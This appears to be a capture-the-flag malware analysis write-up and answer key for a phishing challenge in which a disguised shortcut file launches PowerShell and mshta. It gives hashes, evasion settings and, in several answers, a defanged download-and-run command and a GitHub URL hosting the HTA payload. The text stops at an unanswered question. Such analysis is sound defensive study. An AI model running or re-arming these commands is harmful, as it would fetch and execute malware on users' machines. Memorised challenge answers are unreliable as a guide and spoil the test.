---
title: Operation Silent Serpent MalOps
description: A senior researcher at South Korea’s Ministry of Science opened a mali…
categories:
  - Malware Analysis
tags:
  - Trojan
cover: SilentSerpent/cover.gif
---

## 1.1 The Lure

Scenario: An employee reported a strange email attachment. Your task is to analyze the extracted files and uncover the initial attack vector.

![alt text](SilentSerpent/LzMFmFX.png)

### 1.1.1 Question 1
```
What is the SHA256 hash of the decoy file?
```

R: 1D01EAB612DA7D635E6B92395EAD126E3E07B7987B3A38C8831E25CBCD5456B7

![alt text](SilentSerpent/ZkAV5W4.png)

---

### 1.1.2 Question 2
```
What is the SHA-256 hash of the suspected malicious file?
```

R: E51C6DAF902638023E5922A871279E57D858761EF500C3BCB214737CD39FCBDD

![alt text](SilentSerpent/ntXsEJD.png)

---

### 1.1.3 Question 3
```
Which legitimate file type is the malicious file attempting to impersonate?
```

R: .txt

---

### 1.1.4 Question 4
```
When was this malicious shortcut file created?
```

R: 2025-03-11 19:03:42

![alt text](SilentSerpent/gyVKDrE.png)

---

### 1.1.5 Question 5
```
Which system executable is explicitly targeted to run by this malicious file?
```

R: powershell.exe

![alt text](SilentSerpent/qaFttte.png)

---

### 1.1.6 Question 6
```
To visually deceive the user, the malicious file uses a specific Icon Index. What is the index number?
```

R: 97

![alt text](SilentSerpent/Hh9L6ak.png)

---

### 1.1.7 Question 7
```
What specific 'Show window' flag is set to ensure the payload executes silently without alerting the user?
```

R: SW_SHOWMINNOACTIVE

![alt text](SilentSerpent/ttEssMn.png)

---

### 1.1.8 Question 8
```
After decoding the payload, what is the full command executed by the malicious file?
```

R: powershell mshta "https[:]//link24[.]kr/A46bl74"

![alt text](SilentSerpent/Xq35BMh.png)

---

### 1.1.9 Question 9
```
Which adversary technique is being used when the malicious file leverages a trusted Windows system executable to execute its payload?
```

R: System Binary Proxy Execution

---

### 1.1.10 Question 10
```
The decoded payload utilizes a specific utility to proxy execution. What is the MITRE ATT&CK Sub-technique ID associated with the abuse of this specific binary?
```

R: T1218.005

---

### 1.1.11 Question 11
```
The initial payload makes a network request to a shortened URL. What is the full URL provided in the HTTP redirect response?
```

R: https[:]//github[.]com/deepsearch-tech/ref/releases/download/v1.0.0/pwko[.]hta?v=1 

---

### 1.1.12 Question 12
```
The redirect points to a specific file hosted on a public code repository. What is the name and extension of this downloaded file?
```

R: pwko.hta

---

### 1.1.13 Question 13
```
The redirected URL points to a file hosted on a public repository. What is the username or organization name associated with this repository?
```

R: deepsearch-tech

---

## 2.1 Remote Staging

Scenario: The attacker leverages cloud infrastructure to deliver additional payloads. Analyze the retrieved scripts and map the delivery mechanism

### 2.1.1 Question 1
```
What is the SHA256 hash of the file downloaded from the public repository?
```

R: 587bdf94bdaebcee4b51202beb507125a7fa37d705fb38cc076a9c1814578411

pwko.hta file that was downloaded from the repository.

---

### 2.1.2 Question 2
```
What is the exact file size in bytes of this downloaded payload?
```

R: 58290

---

### 2.1.3 Question 3
```
What is the primary scripting object utilized by the HTA file to execute system commands?
```

R: WSCRIPT.SHELL

---

### 2.1.4 Question 4
```
Which environment variable does the script use to set the working directory at the start?
```
